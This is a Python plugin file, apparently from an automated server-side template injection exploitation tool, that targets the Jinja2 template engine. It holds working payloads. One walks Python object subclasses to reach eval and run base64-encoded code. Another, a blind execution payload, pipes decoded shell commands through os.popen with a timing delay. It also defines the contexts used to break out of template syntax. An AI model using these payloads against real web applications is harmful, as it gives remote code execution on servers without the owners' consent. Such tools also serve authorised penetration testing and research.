from utils.strings import quote
from plugins.languages import python
from utils.loggers import log
from utils import rand
import base64
import re

class Jinja2(python.Python):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '{{%(code)s}}',
                'header': '{{%(header)s}}',
                'trailer': '{{%(trailer)s}}',
                'test_render': '(%(n1)s,%(n2)s*%(n3)s)' % {
                    'n1' : rand.randints[0],
                    'n2' : rand.randints[1],
                    'n3' : rand.randints[2]
                },
                'test_render_expected': '%(res)s' % {
                    'res' : (rand.randints[0],rand.randints[1]*rand.randints[2])
                }
            },
            'evaluate' : {
                'call': 'render',
                'evaluate': """''}}{%% set d = "eval(__import__('base64').urlsafe_b64decode('%(code_b64)s'))" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.__globals__.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval'](d) }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}{{''"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """{%% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode() + ' && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.__globals__.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval'](d) }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            # This covers {{%s}}
            { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : python.ctx_closures },

            # This covers {% %s %}
            { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : python.ctx_closures },

            # If and for blocks
            # # if %s:\n# endif
            # # for a in %s:\n# endfor
            { 'level': 5, 'prefix': '%(closure)s\n', 'suffix' : '\n', 'closures' : python.ctx_closures },

            # Comment blocks
            { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },

        ])
